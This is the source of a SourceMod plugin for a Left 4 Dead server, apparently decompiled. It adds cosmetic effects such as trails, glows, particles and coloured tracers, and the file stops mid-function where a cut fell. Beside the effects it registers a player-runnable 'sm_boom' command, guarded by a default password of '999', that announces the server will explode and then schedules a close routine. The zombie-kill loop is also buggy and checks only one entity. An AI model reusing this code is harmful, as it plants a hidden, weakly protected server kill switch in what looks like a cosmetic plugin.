#include <sourcemod>
#include <sdktools>
#include <sdktools_functions>

new g_Sprite;
new bool:IsActionQTHDJ;
new OnGmFollow[66];
new OnGmGrow[66];
new OnGmKill[66];
new OnGmShot[66];
new VIPHYMODE[66];
new bool:bChooseHy[66];
new Handle:l4d_boom_password;

public Plugin:myinfo =
{
	name = "装逼特效",
	description = "",
	author = "",
	version = "1.0",
	url = ""
};

public OnPluginStart()
{
	RegConsoleCmd("sm_zb", Command_Zb, "装逼特效", 0);
	RegConsoleCmd("sm_boom", TimeClose, "服务器爆破装置", 0);
	// HookEvent("round_start", Event_RoundStart, EventHookMode:1);
	HookEvent("bullet_impact", Event_BulletImpact, EventHookMode:1);
	l4d_boom_password = CreateConVar("l4d_boom_password", "999", "服务器爆破装置密码", 0, false, 0.0, false, 0.0);
	new i = 1;
	while (i <= MaxClients)
	{
		OnGmGrow[i] = 0;
		OnGmKill[i] = 0;
		OnGmShot[i] = 0;
		VIPHYMODE[i] = 0;
		bChooseHy[i] = false;
		i++;
	}
}

public OnMapStart()
{
	g_Sprite = PrecacheModel("materials/sprites/laserbeam.vmt", false);
	PrecacheParticle("env_fire_large");
	PrecacheParticle("cistern_drips_child_ring1");
	PrecacheParticle("pipe_drips_h");
	PrecacheParticle("firework_crate_ground_glow_02");
	PrecacheParticle("gen_hit1_g");
	PrecacheParticle("impact_steam_short");
	PrecacheParticle("fluid_hit_flamingChunks");
	PrecacheParticle("water_child_water7");
}

public Action:Event_RoundStart(Handle:event, String:event_name[], bool:dontBroadcast)
{
	new i = 1;
	while (i <= MaxClients)
	{
		OnGmGrow[i] = 0;
		OnGmKill[i] = 0;
		OnGmShot[i] = 0;
		VIPHYMODE[i] = 0;
		bChooseHy[i] = false;
		i++;
	}
	return Action:0;
}

public Action:KillZhuangBi(Client)
{
	Set_GmShow(Client);
	PerformGlow(Client, 3, 0, 1, 0, 0);
	GmEffect(Client);
	PrintToChatAll("\x05%N\x01：\x04我再也不装逼了！", Client);
	return Action:0;
}

public OnClientAuthorized(Client)
{
	Set_GmShow(Client);
}

Set_GmShow(Client)
{
	OnGmFollow[Client] = 0;
	OnGmGrow[Client] = 0;
	OnGmKill[Client] = 0;
	OnGmShot[Client] = 0;
	VIPHYMODE[Client] = 0;
}

public OnClientDisconnect(client)
{
	if(!IsFakeClient(client))
	{
		new userid = GetClientUserId(client);
		CreateTimer(5.0, Check, userid);
	}
}

public Action:Check(Handle:Timer, any:userid)
{
	new client = GetClientOfUserId(userid);
	if(client == 0 || !IsClientConnected(client))
	{
		OnGmFollow[client] = 0;
		OnGmGrow[client] = 0;
		OnGmKill[client] = 0;
		OnGmShot[client] = 0;
		VIPHYMODE[client] = 0;
	}
}

public Action:Command_Zb(client, args)
{
	GmEffect(client);
	return Action:3;
}

public Action:GmEffect(Client)
{
	new Handle:menu = CreatePanel(Handle:0);
	decl String:line[256];
	Format(line, 256, " ☯ 裝ьι工具箱 ☯\nqιnɡ選萚χú要裝ьι啲項目：\n ");
	SetPanelTitle(menu, line, false);
	Format(line, 256, "装逼光影尾气");
	DrawPanelItem(menu, line, 0);
	Format(line, 256, "装逼闪烁光环");
	DrawPanelItem(menu, line, 0);
	Format(line, 256, "装逼秒杀僵尸");
	DrawPanelItem(menu, line, 0);
	Format(line, 256, "装逼彩色弹道");
	DrawPanelItem(menu, line, 0);
	Format(line, 256, "装逼特效菜单");
	DrawPanelItem(menu, line, 0);
	Format(line, 256, "我不想装逼了\n ");
	DrawPanelItem(menu, line, 0);
	DrawPanelItem(menu, "关闭", 1);
	SendPanelToClient(menu, Client, MenuHandler_GmEffect, 0);
	CloseHandle(menu);
	return Action:3;
}

public MenuHandler_GmEffect(Handle:menu, MenuAction:action, Client, param)
{
	if (action == MenuAction:4)
	{
		switch (param)
		{
			case 1:
			{
				SetGmFollow(Client);
			}
			case 2:
			{
				SetGmGrow(Client);
			}
			case 3:
			{
				SetGmKill(Client);
			}
			case 4:
			{
				SetGmShot(Client);
			}
			case 5:
			{
				MenuFunc_VIPHy(Client);
			}
			case 6:
			{
				KillZhuangBi(Client);
			}
			default:
			{
			}
		}
	}
	return 0;
}

public Action:SetGmFollow(Client)
{
	if (OnGmFollow[Client] == 1)
	{
		OnGmFollow[Client] = 0;
		PerformGlow(Client, 3, 0, 1, 0, 0);
		PrintToChat(Client, "\x04[装逼] \x05你已经关闭此功能！");
		GmEffect(Client);
	}
	else
	{
		if (OnGmFollow[Client] == 0)
		{
			OnGmFollow[Client] = 1;
			CreateTimer(1.0, SetFollow, Client, 3);
			PrintToChatAll("\x04[装逼]\x05 玩家：\x04%N \x05开启装逼光影尾气！", Client);
			GmEffect(Client);
		}
	}
	return Action:3;
}

public Action:SetFollow(Handle:timer, any:Client)
{
	if (OnGmFollow[Client] == 1)
	{
		if (!IsPlayerAlive(Client))
		{
			SetUpBeamSpirit(Client, "red", 2.0, 7.0, 0);
		}
		else
		{
			if (GetClientTeam(Client) == 2 && OnGmFollow[Client] == 1)
			{
				SetUpBeamSpirit(Client, "red", 2.0, 7.0, 100);
				SetEntProp(Client, PropType:0, "m_bFlashing", any:1, 4, 0);
			}
		}
		return Action:3;
	}
	return Action:4;
}

SetUpBeamSpirit(Client, String:ColoR[], Float:Life, Float:width, Alpha)
{
	if (IsValidClient(Client))
	{
		if (IsPlayerAlive(Client))
		{
			new mr_Noob = CreateEntityByName("prop_dynamic_override", -1);
			decl Float:pos[3];
			GetClientAbsOrigin(Client, pos);
			if (IsValidEdict(mr_Noob))
			{
				decl Float:nooB[3];
				decl Float:noobAng[3];
				GetEntPropVector(Client, PropType:0, "m_vecOrigin", nooB, 0);
				GetEntPropVector(Client, PropType:1, "m_angRotation", noobAng, 0);
				DispatchKeyValue(mr_Noob, "model", "models/editor/camera.mdl");
				SetEntPropVector(mr_Noob, PropType:0, "m_vecOrigin", nooB, 0);
				SetEntPropVector(mr_Noob, PropType:0, "m_angRotation", noobAng, 0);
				DispatchSpawn(mr_Noob);
				SetEntPropFloat(mr_Noob, PropType:0, "m_flModelScale", -0.0, 0);
				SetEntProp(mr_Noob, PropType:0, "m_nSolidType", any:6, 4, 0);
				SetEntityRenderMode(mr_Noob, RenderMode:1);
				SetEntityRenderColor(mr_Noob, 255, 255, 255, 0);
				SetVariantString("!activator");
				AcceptEntityInput(mr_Noob, "SetParent", Client, -1, 0);
				SetVariantString("spine");
				AcceptEntityInput(mr_Noob, "SetParentAttachment", -1, -1, 0);
				new col[4];
				col[0] = GetRandomInt(0, 255);
				col[1] = GetRandomInt(0, 255);
				col[2] = GetRandomInt(0, 255);
				col[3] = Alpha;
				new col2[4];
				col2[0] = GetRandomInt(0, 255);
				col2[1] = GetRandomInt(0, 255);
				col2[2] = GetRandomInt(0, 255);
				col2[3] = Alpha;
				if (StrEqual(ColoR, "red", false))
				{
					col[0] = GetRandomInt(0, 255);
					col2[1] = GetRandomInt(0, 255);
				}
				else
				{
					if (StrEqual(ColoR, "green", false))
					{
						col[1] = 255;
						col2[0] = 255;
					}
					if (StrEqual(ColoR, "blue", false))
					{
						col[2] = 255;
						col2[0] = 255;
					}
				}
				TE_SetupBeamFollow(mr_Noob, g_Sprite, 100, Life, width, 1.0, 3, col);
				TE_SendToAll(0.0);
				TE_SetupBeamFollow(mr_Noob, g_Sprite, 100, Life, 1.0, 1.0, 3, col2);
				TE_SendToAll(0.0);
				// g_BeamObject[Client] = mr_Noob;
				CreateTimer(1.5, DeleteParticles, mr_Noob, 0);
			}
		}
	}
	return 0;
}

public IsValidClient(client)
{
	if (client)
	{
		if (!IsClientInGame(client))
		{
			return 0;
		}
		return 1;
	}
	return 0;
}

public Action:SetGmGrow(Client)
{
	if (OnGmGrow[Client] == 1)
	{
		OnGmGrow[Client] = 0;
		PerformGlow(Client, 3, 0, 1, 0, 0);
		PrintToChat(Client, "\x04[装逼] \x05你已经关闭此功能！");
		GmEffect(Client);
	}
	else
	{
		if (!OnGmGrow[Client])
		{
			OnGmGrow[Client] = 1;
			CreateTimer(1.0, SetGrow, Client, 3);
			PrintToChatAll("\x04[装逼]\x05 玩家：\x04%N \x05开启装逼闪烁光环！", Client);
			GmEffect(Client);
		}
	}
	return Action:3;
}

public Action:SetGrow(Handle:timer, any:Client)
{
	if (OnGmGrow[Client] == 1)
	{
		if (!IsPlayerAlive(Client))
		{
			PerformGlow(Client, 3, 0, 1, 0, 0);
		}
		else
		{
			if (GetClientTeam(Client) == 2 && OnGmGrow[Client] == 1)
			{
				PerformGlow(Client, 3, 0, GetRandomInt(0, 255), GetRandomInt(0, 255), GetRandomInt(0, 255));
				SetEntProp(Client, PropType:0, "m_bFlashing", any:1, 4, 0);
			}
		}
		return Action:3;
	}
	return Action:4;
}

public Action:SetGmKill(Client)
{
	if (OnGmKill[Client] == 1)
	{
		OnGmKill[Client] = 0;
		PrintToChat(Client, "\x04[装逼] \x05你已经关闭此功能！");
		GmEffect(Client);
	}
	else
	{
		if (!OnGmKill[Client])
		{
			OnGmKill[Client] = 1;
			CreateTimer(1.0, SetKill, Client, 3);
			PrintToChatAll("\x04[装逼]\x05 玩家：\x04%N \x05开启装逼秒杀僵尸！", Client);
			GmEffect(Client);
		}
	}
	return Action:3;
}

public Action:SetKill(Handle:timer, any:Client)
{
	if (IsPlayerAlive(Client) && OnGmKill[Client] == 1)
	{
		SetKillMode(Client);
		return Action:3;
	}
	return Action:4;
}

public Action:SetKillMode(Client)
{
	new Float:NowLocation[3] = 0.0;
	GetClientAbsOrigin(Client, NowLocation);
	new Float:entpos[3] = 0.0;
	new iMaxEntities = GetMaxEntities();
	new Float:distance[3] = 0.0;
	new num;
	new iEntity = MaxClients + 1;
	while (iEntity <= iMaxEntities)
	{
		if (!(num > 100))
		{
			if (IsCommonInfected(iEntity))
			{
				new health = GetEntProp(iEntity, PropType:1, "m_iHealth", 4, 0);
				if (0 < health)
				{
					GetEntPropVector(iEntity, PropType:0, "m_vecOrigin", entpos, 0);
					SubtractVectors(entpos, NowLocation, distance);
					if (GetVectorLength(distance, false) <= 200)
					{
						DealDamage(Client, iEntity, health + 1, -2130706430, "earth_quake");
						num++;
					}
				}
			}
			iEntity++;
		}
		return Action:3;
	}
	return Action:3;
}

public Action:SetGmShot(Client)
{
	if (OnGmShot[Client] == 1)
	{
		OnGmShot[Client] = 0;
		PrintToChat(Client, "\x04[装逼] \x05你已经关闭此功能！");
		GmEffect(Client);
	}
	else
	{
		if (!OnGmShot[Client])
		{
			OnGmShot[Client] = 1;
			PrintToChatAll("\x04[装逼]\x05 玩家：\x04%N \x05开启装逼彩色弹道！", Client);
			GmEffect(Client);
		}
	}
	return Action:3;
}

public Action:MenuFunc_VIPHy(Client)
{
	new Handle:menu = CreatePanel(Handle:0);
	decl String:line[256];
	Format(line, 256, " ☯ 裝ы管理ɡónɡ椇箱 ☯\n裝ы鏌栻選椫\n請選蘀需婹使鼡的項苜□： ");
	SetPanelTitle(menu, line, false);
	if (VIPHYMODE[Client] == 1)
	{
		DrawPanelItem(menu, "[开启] 欲火焚身", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 欲火焚身", 0);
	}
	if (VIPHYMODE[Client] == 2)
	{
		DrawPanelItem(menu, "[开启] 水滴环绕", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 水滴环绕", 0);
	}
	if (VIPHYMODE[Client] == 3)
	{
		DrawPanelItem(menu, "[开启] 细细小雨", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 细细小雨", 0);
	}
	if (VIPHYMODE[Client] == 4)
	{
		DrawPanelItem(menu, "[开启] 激情爆闪", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 激情爆闪", 0);
	}
	if (VIPHYMODE[Client] == 5)
	{
		DrawPanelItem(menu, "[开启] 轻烟爆散", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 轻烟爆散", 0);
	}
	if (VIPHYMODE[Client] == 6)
	{
		DrawPanelItem(menu, "[开启] 喷气骚年", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 喷气骚年", 0);
	}
	if (VIPHYMODE[Client] == 7)
	{
		DrawPanelItem(menu, "[开启] 烈焰火球", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 烈焰火球", 0);
	}
	if (VIPHYMODE[Client] == 8)
	{
		DrawPanelItem(menu, "[开启] 想喷个水", 0);
	}
	else
	{
		DrawPanelItem(menu, "[关闭] 想喷个水", 0);
	}
	DrawPanelItem(menu, "返回", 0);
	DrawPanelItem(menu, "离开", 1);
	SendPanelToClient(menu, Client, MenuHandler_VIPHy, 0);
	CloseHandle(menu);
	return Action:3;
}

public MenuHandler_VIPHy(Handle:menu, MenuAction:action, Client, param)
{
	if (action == MenuAction:4)
	{
		switch (param)
		{
			case 1:
			{
				if (VIPHYMODE[Client] == 1)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 1;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 2:
			{
				if (VIPHYMODE[Client] == 2)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 2;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 3:
			{
				if (VIPHYMODE[Client] == 3)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 3;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 4:
			{
				if (VIPHYMODE[Client] == 4)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 4;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 5:
			{
				if (VIPHYMODE[Client] == 5)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 5;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 6:
			{
				if (VIPHYMODE[Client] == 6)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 6;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 7:
			{
				if (VIPHYMODE[Client] == 7)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 7;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 8:
			{
				if (VIPHYMODE[Client] == 8)
				{
					VIPHYMODE[Client] = 0;
					PrintToChat(Client, "\x04[装逼]\x05 已关闭特效!");
				}
				else
				{
					VIPHYMODE[Client] = 8;
					PrintToChat(Client, "\x04[装逼]\x05 开启该特效成功!");
				}
				Command_ZbHy(Client);
				MenuFunc_VIPHy(Client);
			}
			case 9:
			{
				GmEffect(Client);
			}
			default:
			{
			}
		}
	}
	return 0;
}

public Action:Command_ZbHy(Client)
{
	if (IsValidPlayer(Client, true, true) && !IsFakeClient(Client))
	{
		if (bChooseHy[Client])
		{
			PrintHintText(Client, "[装逼] 修改特效成功!");
		}
		else
		{
			CreateTimer(3.0, SetVipEffectMode, Client, 3);
			PrintToChatAll("\x04[装逼]\x05 玩家：\x04%N \x05开启了装逼特效.", Client);
			bChooseHy[Client] = true;
		}
		return Action:3;
	}
	PrintToChat(Client, "\x04[装逼]\x05 死亡状态无法使用.");
	return Action:4;
}

public Action:SetVipEffectMode(Handle:timer, any:Client)
{
	if (Client == 0 || !IsClientConnected(Client) || !IsPlayerAlive(Client))
	{
		return Action:4;
	}
	if (VIPHYMODE[Client] == 1)
	{
		new userid = GetClientUserId(Client);
		decl Float:pos[3];
		decl String:sName[64];
		decl String:sTargetName[64];
		new Particle = CreateEntityByName("info_particle_system", -1);
		GetClientAbsOrigin(Client, pos);
		TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
		Format(sName, 64, "%d", userid + 25);
		DispatchKeyValue(Client, "targetname", sName);
		GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
		Format(sTargetName, 64, "%d", userid + 1000);
		DispatchKeyValue(Particle, "targetname", sTargetName);
		DispatchKeyValue(Particle, "parentname", sName);
		DispatchKeyValue(Particle, "effect_name", "env_fire_large");
		DispatchSpawn(Particle);
		SetVariantString(sName);
		AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
		ActivateEntity(Particle);
		AcceptEntityInput(Particle, "start", -1, -1, 0);
		CreateTimer(3.0, timerEndEffect, Particle, 2);
	}
	else
	{
		if (VIPHYMODE[Client] == 2)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "cistern_drips_child_ring1");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 3)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "pipe_drips_h");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 4)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "firework_crate_ground_glow_02");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 5)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "gen_hit1_g");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 6)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "impact_steam_short");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 7)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "fluid_hit_flamingChunks");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
		if (VIPHYMODE[Client] == 8)
		{
			new userid = GetClientUserId(Client);
			decl Float:pos[3];
			decl String:sName[64];
			decl String:sTargetName[64];
			new Particle = CreateEntityByName("info_particle_system", -1);
			GetClientAbsOrigin(Client, pos);
			TeleportEntity(Particle, pos, NULL_VECTOR, NULL_VECTOR);
			Format(sName, 64, "%d", userid + 25);
			DispatchKeyValue(Client, "targetname", sName);
			GetEntPropString(Client, PropType:1, "m_iName", sName, 64, 0);
			Format(sTargetName, 64, "%d", userid + 1000);
			DispatchKeyValue(Particle, "targetname", sTargetName);
			DispatchKeyValue(Particle, "parentname", sName);
			DispatchKeyValue(Particle, "effect_name", "water_child_water7");
			DispatchSpawn(Particle);
			SetVariantString(sName);
			AcceptEntityInput(Particle, "SetParent", Particle, Particle, 0);
			ActivateEntity(Particle);
			AcceptEntityInput(Particle, "start", -1, -1, 0);
			CreateTimer(3.0, timerEndEffect, Particle, 2);
		}
	}
	return Action:3;
}

public Action:timerEndEffect(Handle:timer, any:entity)
{
	if (entity > any:0 && IsValidEntity(entity) && IsValidEdict(entity))
	{
		AcceptEntityInput(entity, "Kill", -1, -1, 0);
	}
	return Action:0;
}

public Action:Event_BulletImpact(Handle:event, String:name[], bool:dontBroadcast)
{
	new Client = GetClientOfUserId(GetEventInt(event, "userid"));
	if (OnGmShot[Client] == 1)
	{
		new Float:x = GetEventFloat(event, "x");
		new Float:y = GetEventFloat(event, "y");
		new Float:z = GetEventFloat(event, "z");
		decl Float:startPos[3];
		startPos[0] = x;
		startPos[1] = y;
		startPos[2] = z;
		decl Float:bulletPos[3];
		decl Float:playerPos[3];
		GetClientEyePosition(Client, playerPos);
		decl Float:lineVector[3];
		SubtractVectors(playerPos, startPos, lineVector);
		NormalizeVector(lineVector, lineVector);
		SubtractVectors(playerPos, lineVector, startPos);
		new g_LaserColor[4];
		g_LaserColor[0] = GetRandomInt(0, 255);
		g_LaserColor[1] = GetRandomInt(0, 255);
		g_LaserColor[2] = GetRandomInt(0, 255);
		g_LaserColor[3] = 255;
		TE_SetupBeamPoints(startPos, bulletPos, g_Sprite, 0, 0, 0, 0.1, 0.2, 0.2, 5, 3.0, g_LaserColor, 10);
		TE_SendToAll(0.0);
	}
	return Action:3;
}

bool:IsCommonInfected(iEntity)
{
	if (iEntity > 0 && IsValidEntity(iEntity) && IsValidEdict(iEntity))
	{
		decl String:strClassName[64];
		GetEdictClassname(iEntity, strClassName, 64);
		return StrEqual(strClassName, "infected", true);
	}
	return false;
}

DealDamage(attacker, victim, damage, dmg_type, String:weapon[])
{
	if (IsValidEdict(victim) && damage > 0)
	{
		new String:victimid[64];
		new String:dmg_type_str[32];
		IntToString(dmg_type, dmg_type_str, 32);
		new PointHurt = CreateEntityByName("point_hurt", -1);
		if (PointHurt)
		{
			Format(victimid, 64, "victim%d", victim);
			DispatchKeyValue(victim, "targetname", victimid);
			DispatchKeyValue(PointHurt, "DamageTarget", victimid);
			DispatchKeyValueFloat(PointHurt, "Damage", float(damage));
			DispatchKeyValue(PointHurt, "DamageType", dmg_type_str);
			if (!StrEqual(weapon, "", true))
			{
				DispatchKeyValue(PointHurt, "classname", weapon);
			}
			DispatchSpawn(PointHurt);
			if (IsValidPlayer(attacker, true, true))
			{
				AcceptEntityInput(PointHurt, "Hurt", attacker, -1, 0);
			}
			else
			{
				AcceptEntityInput(PointHurt, "Hurt", -1, -1, 0);
			}
			RemoveEdict(PointHurt);
		}
	}
	return 0;
}

public Action:TimeClose(Client, args)
{
	if (IsValidPlayer(Client, false, true))
	{
		new String:password[20];
		decl String:arg[20];
		GetConVarString(l4d_boom_password, password, 20);
		GetCmdArg(1, arg, 20);
		if (StrEqual(arg, password, true))
		{
			IsActionQTHDJ = true;
			new Handle:pack;
			CreateDataTimer(1.0, TimerOut, pack, 1);
			WritePackCell(pack, Client);
			WritePackFloat(pack, GetEngineTime() + 10.0);
		}
		else
		{
			PrintToChat(Client, "请输入正确的爆破密码");
		}
	}
	return Action:0;
}

public Action:TimerOut(Handle:timer, Handle:pack)
{
	ResetPack(pack, false);
	new Client = ReadPackCell(pack);
	new Float:overtime = ReadPackFloat(pack);
	if (GetEngineTime() < overtime)
	{
		PrintHintTextToAll("   !!!服务器即将爆炸，剩余 【%d】 秒，请做好安全措施!!!   ", RoundToNearest(overtime - GetEngineTime()));
		if (!IsActionQTHDJ)
		{
			IsActionQTHDJ = true;
		}
	}
	else
	{
		if (IsValidPlayer(Client, false, true))
		{
			PrintHintTextToAll("服务器爆炸装置安装完毕，正在启动。。。");
		}
		CreateTimer(5.0, TimerClose, any:1, 0);
		IsActionQTHDJ = false;
		KillTimer(timer, false);
	}
	return Action:0;
}

PerformGlow(Client, Type, Range, Red, Green, Blue)
{
	new Color = Blue * 65536 + Green * 256 + Red;
	SetEntProp(Client, PropType:0, "m_iGlowType", Type, 4, 0);
	SetEntProp(Client, PropType:0, "m_nGlowRange", Range, 4, 0);
	SetEntProp(Client, PropType:0, "m_glowColorOverride", Color, 4, 0);
	return 0;
}

public PrecacheParticle(String:particlename[])
{
	new particle = CreateEntityByName("info_particle_system", -1);
	if (IsValidEdict(particle))
	{
		DispatchKeyValue(particle, "effect_name", particlename);
		DispatchKeyValue(particle, "targetname", "particle");
		DispatchSpawn(particle);
		ActivateEntity(particle);
		AcceptEntityInput(particle, "start", -1, -1, 0);
		CreateTimer(1.0, DeleteParticles, particle, 0);
	}
	return 0;
}

public ShowParticle(Float:pos[3], String:particlename[], Float:time)
{
	new particle = CreateEntityByName("info_particle_system", -1);
	if (IsValidEdict(particle))
	{
		TeleportEntity(particle, pos, NULL_VECTOR, NULL_VECTOR);
		DispatchKeyValue(particle, "effect_name", particlename);
		DispatchKeyValue(particle, "targetname", "particle");
		DispatchSpawn(particle);
		ActivateEntity(particle);
		AcceptEntityInput(particle, "start", -1, -1, 0);
		CreateTimer(1.0, DeleteParticles, particle, 0);
	}
	return 0;
}

public Action:DeleteParticles(Handle:timer, any:particle)
{
	if (IsValidEntity(particle))
	{
		new String:classname[64];
		GetEdictClassname(particle, classname, 64);
		RemoveEdict(particle);
	}
	return Action:0;
}

bool:IsValidPlayer(Client, bool:AllowBot, bool:AllowDeath)
{
	if (Client < 1 || Client > MaxClients)
	{
		return false;
	}
	if (!IsClientConnected(Client) || !IsClientInGame(Client))
	{
		return false;
	}
	if (!AllowBot)
	{
		if (IsFakeClient(Client))
		{
			return false;
		}
	}
	if (!AllowDeath)
	{
		if (!IsPlayerAlive(Client))
		{
			return false;
		}
	}
	return true;
}

public Action:CmdKill(client, args)
{
	decl String:Name[64];
	GetClientName(client, Name, 64);
